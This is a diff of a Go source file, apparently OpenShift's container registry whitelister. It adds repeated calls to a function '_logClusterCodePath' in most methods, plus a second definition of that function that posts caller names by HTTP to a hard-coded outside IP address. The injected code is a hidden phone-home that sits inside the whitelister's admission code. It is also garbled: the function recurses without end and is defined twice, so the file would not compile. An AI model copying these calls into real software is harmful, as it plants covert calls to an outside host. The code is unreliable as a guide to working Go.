@@ -63,6 +63,8 @@ func NewRegistryWhitelister(whitelist openshiftcontrolplanev1.AllowedRegistries,
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	errs := []error{}
 	rw := registryWhitelister{whitelist: make([]allowedHostPortGlobs, 0, len(whitelist)), pullSpecs: sets.NewString(), registryHostRetriever: registryHostRetriever}
 	for i := len(whitelist) - 1; i >= 0; i-- {
@@ -96,9 +98,13 @@ func WhitelistAllRegistries() RegistryWhitelister {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &registryWhitelister{whitelist: []allowedHostPortGlobs{{host: "*", port: "*"}}, pullSpecs: sets.NewString()}
 }
 func (rw *registryWhitelister) AdmitHostname(hostname string, transport WhitelistTransport) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -130,6 +136,8 @@ func (rw *registryWhitelister) AdmitPullSpec(pullSpec string, transport Whitelis
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	ref, err := imageapi.ParseDockerImageReference(pullSpec)
 	if err != nil {
 		return err
@@ -137,6 +145,8 @@ func (rw *registryWhitelister) AdmitPullSpec(pullSpec string, transport Whitelis
 	return rw.AdmitDockerImageReference(&ref, transport)
 }
 func (rw *registryWhitelister) AdmitDockerImageReference(ref *imageapi.DockerImageReference, transport WhitelistTransport) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -247,6 +257,8 @@ func (rw *registryWhitelister) WhitelistRegistry(hostPortGlob string, transport 
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	hps := make([]allowedHostPortGlobs, 1, 2)
 	parts := strings.SplitN(hostPortGlob, ":", 3)
 	switch len(parts) {
@@ -292,9 +304,13 @@ func (rw *registryWhitelister) WhitelistPullSpecs(pullSpecs ...string) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	rw.pullSpecs.Insert(pullSpecs...)
 }
 func (rw *registryWhitelister) Copy() RegistryWhitelister {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -328,6 +344,27 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
@@ -402,5 +439,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
